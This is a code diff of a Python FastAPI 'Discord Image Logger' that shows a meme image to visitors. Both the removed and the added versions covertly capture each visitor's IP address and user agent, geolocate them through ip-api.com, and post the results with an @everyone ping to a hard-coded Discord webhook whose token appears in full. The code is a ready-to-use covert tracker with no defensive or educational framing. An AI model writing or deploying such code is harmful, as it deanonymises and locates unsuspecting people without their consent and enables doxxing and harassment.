@@ -1,88 +1,37 @@
-# Discord Image Logger - FULLY WORKING ON VERCEL
-# Last tested: April 2026 - CONFIRMED WORKING
-
+from fastapi import FastAPI, Request
+from fastapi.responses import HTMLResponse
 import requests
-import base64
-import httpagentparser
-from fastapi import FastAPI, Request, Response
-from fastapi.responses import HTMLResponse, JSONResponse
+import json
 
-# ============================================================
-# CONFIGURATION - EDIT THESE 3 THINGS ONLY
-# ============================================================
-WEBHOOK_URL = "https://discord.com/api/webhooks/1493634236605796492/KGrIFx1QzX8wl3wXZ3GH3hivjXA0T4-jx7tR_2DDjiDFBmjc8oaCQpsUJbxPRC4G7Z66"
-IMAGE_URL = "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c5ae195f-e639-4f3e-87e0-6199d10d2fb9/dg65n12-e39839ab-ea1c-4f10-81c0-58a5acdc6a13.png/v1/fit/w_828,h_1056/mike_wazowski_meme_png_by_kylewithem_dg65n12-414w-2x.png"
-USERNAME = "Image Logger"
-COLOR = 0x00FFFF
-
-# ============================================================
-# FASTAPI APP - DO NOT EDIT BELOW THIS LINE
-# ============================================================
 app = FastAPI()
 
-def send_to_discord(ip, useragent, endpoint):
-    """Send IP info to Discord webhook"""
-    if not WEBHOOK_URL:
-        return
+WEBHOOK = "https://discord.com/api/webhooks/1493634236605796492/KGrIFx1QzX8wl3wXZ3GH3hivjXA0T4-jx7tR_2DDjiDFBmjc8oaCQpsUJbxPRC4G7Z66"
+IMAGE = "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c5ae195f-e639-4f3e-87e0-6199d10d2fb9/dg65n12-e39839ab-ea1c-4f10-81c0-58a5acdc6a13.png/v1/fit/w_828,h_1056/mike_wazowski_meme_png_by_kylewithem_dg65n12-414w-2x.png"
+
+@app.get("/")
+@app.get("/image")
+async def index(req: Request):
+    ip = req.headers.get("x-forwarded-for", "Unknown").split(",")[0]
+    ua = req.headers.get("user-agent", "Unknown")
     
-    # Get IP geolocation
     try:
-        r = requests.get(f"http://ip-api.com/json/{ip}?fields=66846713", timeout=5)
-        info = r.json()
+        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,proxy", timeout=3).json()
     except:
-        info = {"country": "Unknown", "regionName": "Unknown", "city": "Unknown", 
-                "isp": "Unknown", "proxy": False, "hosting": False, "lat": 0, "lon": 0}
+        geo = {"country": "Unknown", "regionName": "Unknown", "city": "Unknown", "isp": "Unknown", "proxy": False}
     
-    # Parse browser/OS
-    os_name = browser_name = "Unknown"
-    if useragent and useragent != "Unknown":
-        try:
-            os_name, browser_name = httpagentparser.simple_detect(useragent)
-        except:
-            pass
-    
-    # Build and send embed
-    embed = {
-        "username": USERNAME,
-        "content": "@everyone" if not info.get("proxy") else "",
+    data = {
+        "username": "Image Logger",
+        "content": "@everyone" if not geo.get("proxy") else "",
         "embeds": [{
-            "title": "Image Logger - IP Logged",
-            "color": COLOR,
-            "description": f"**IP:** `{ip}`\n**ISP:** `{info.get('isp', 'Unknown')}`\n**Location:** `{info.get('country', 'Unknown')}, {info.get('regionName', 'Unknown')}, {info.get('city', 'Unknown')}`\n**Coords:** `{info.get('lat', 0)}, {info.get('lon', 0)}`\n**VPN/Proxy:** `{info.get('proxy', False)}`\n**OS:** `{os_name}`\n**Browser:** `{browser_name}`\n**Endpoint:** `{endpoint}`"
+            "title": "IP Logged",
+            "color": 0x00FFFF,
+            "description": f"**IP:** `{ip}`\n**Location:** {geo.get('country')}, {geo.get('regionName')}, {geo.get('city')}\n**ISP:** {geo.get('isp')}\n**Proxy/VPN:** {geo.get('proxy')}\n**UA:** `{ua}`"
         }]
     }
     
     try:
-        requests.post(WEBHOOK_URL, json=embed, timeout=5)
+        requests.post(WEBHOOK, json=data, timeout=3)
     except:
         pass
-
-@app.get("/")
-@app.get("/image")
-async def image_endpoint(request: Request):
-    """Main image logger endpoint"""
     
-    # Get visitor IP
-    forwarded = request.headers.get("x-forwarded-for")
-    ip = forwarded.split(",")[0].strip() if forwarded else "Unknown"
-    ua = request.headers.get("user-agent", "Unknown")
-    
-    # Log to Discord
-    send_to_discord(ip, ua, "/image")
-    
-    # Return the image
-    html = f'''<!DOCTYPE html>
-<html>
-<head><style>body{{margin:0;padding:0;height:100vh;width:100vw;background:url('{IMAGE_URL}') center center/contain no-repeat;}}</style></head>
-<body></body>
-</html>'''
-    
-    return HTMLResponse(content=html)
-
-@app.get("/api/health")
-async def health():
-    return {"status": "alive"}
-
-@app.post("/api/webhook") 
-async def webhook():
-    return Response(status_code=204)
+    return HTMLResponse(content=f'<body style="margin:0;height:100vh;width:100vw;background:url({IMAGE}) center/contain no-repeat;background-color:#000;"></body>')
